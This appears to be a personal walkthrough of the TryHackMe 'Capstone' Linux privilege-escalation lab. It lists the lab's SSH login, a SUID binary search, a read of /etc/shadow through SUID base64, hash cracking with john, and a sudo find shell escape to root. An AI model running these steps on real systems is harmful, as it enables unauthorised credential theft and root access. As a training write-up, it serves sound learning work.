# Capstone (Privesc)

Plataforma: TryHackMe
OS: Linux
Level: Easy
Status: Done
Complete: Yes
Created time: 4 de diciembre de 2024 21:34

## Notas

Maquina dedicada únicamente a la escalada de privilegios

You can access the target machine over your browser or use the SSH credentials below.

- Username: leonard
- Password: Penny123

## Explotación

```bash
sudo -l
Sorry, user leonard may not run sudo on ip-10-10-194-26

```

```bash
find / -perm -u=s -type f 2>/dev/null

Output:

/usr/bin/base64 <--
/usr/bin/ksu
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chage
/usr/bin/newgrp
/usr/bin/staprun
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/Xorg
/usr/bin/mount
/usr/bin/umount
/usr/bin/crontab
/usr/bin/pkexec
/usr/bin/at
/usr/bin/sudo
/usr/sbin/pam_timestamp_check

```

```bash
"SUID Base64"

LFILE="/etc/shadow"
base64 "$LFILE" | base64 --decode

cat /etc/paswd

Attacker Machine

unshadow passwd shadow > credentials.txt
john credentials.txt

Proceeding with wordlist:/usr/share/john/password.lst
Password1        (missy)

Username: missy
Password: Password1

```

```
su missy
missy$:

```

Una vez migrados a missy, seguimos buscando binarios

```bash
sudo -l
 (ALL) NOPASSWD: /usr/bin/find

"Sudo exploit (gtfobins)"

sudo find . -exec /bin/sh \\; -quit

Explotación posterior
```

## Conclusión